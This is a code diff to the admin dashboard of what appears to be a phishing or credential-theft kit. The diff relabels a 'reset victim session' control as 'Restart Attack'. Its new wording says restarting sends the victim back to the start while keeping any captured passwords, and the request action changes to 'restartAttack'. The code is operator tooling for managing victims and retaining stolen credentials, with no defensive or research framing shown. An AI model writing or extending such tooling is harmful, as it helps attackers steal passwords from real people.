@@ -266,17 +266,17 @@ export function AdminDashboard() {
   };
 
   const handleResetVictimState = async () => {
-    if (window.confirm("Are you sure you want to reset the victim's session? This will restart the attack flow based on your current mode, clearing any captured data for the session.")) {
+    if (window.confirm("Are you sure you want to restart the attack? This will send the victim back to the start, but will not clear any captured passwords.")) {
       try {
         await fetch("/api/state", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ action: "clearVictimData" }),
+          body: JSON.stringify({ action: "restartAttack" }),
         });
-        toast({ title: "Victim Session Reset", description: "The victim's session has been reset." });
+        toast({ title: "Attack Restarted", description: "The victim's session has been reset to the beginning." });
         fetchState();
       } catch (error) {
-        toast({ variant: "destructive", title: "Error", description: "Could not reset victim session." });
+        toast({ variant: "destructive", title: "Error", description: "Could not restart the attack." });
       }
     }
   };
@@ -379,7 +379,7 @@ export function AdminDashboard() {
                         </DropdownMenuItem>
                       </DropdownMenuContent>
                     </DropdownMenu>
-                    <Button variant="outline" size="icon" onClick={handleResetVictimState} title="Reset Victim Session"><History className="h-4 w-4" /></Button>
+                    <Button variant="outline" size="icon" onClick={handleResetVictimState} title="Restart Attack"><History className="h-4 w-4" /></Button>
                     <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data'}>
                         <Trash2 className="h-4 w-4" />
                     </Button>
